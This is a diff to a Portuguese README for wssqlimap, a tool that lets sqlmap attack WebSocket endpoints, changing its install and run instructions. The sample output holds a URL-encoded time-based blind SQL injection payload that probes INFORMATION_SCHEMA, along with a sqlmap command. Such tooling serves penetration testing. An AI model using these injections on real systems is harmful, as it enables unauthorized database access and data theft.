@@ -38,13 +38,13 @@ options:
 O wssqlimap requer **python3** e para baixá-lo só usar:
 
 ```sh
-pip3 install wssqlimap 
+git clone https://github.com/joaoviictorti/wssqlimap
 ```
 
 # Executando WebSocket
 
 ```console
-wssqlimap --ws "ws://teste.com:9091/" --lhost 127.0.0.1 --lport 6060
+python3 wssqlimap.py --ws "ws://teste.com:9091/" --lhost 127.0.0.1 --lport 6060
 Use esse comando em outro terminal para realização da injeção com sqlmap: sqlmap -u "http://ip:port/?id=123" -p id .....
 
 127.0.0.1 - - [29/Dec/2022 15:39:29] "GET /?id=1%20AND%20%28SELECT%206390%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20DISTINCT%28IFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%201%2C1%29%2C6%2C1%29%29%3E64%2C0%2C5%29%29%29%29%29iTrK%29 HTTP/1.1" 200 -
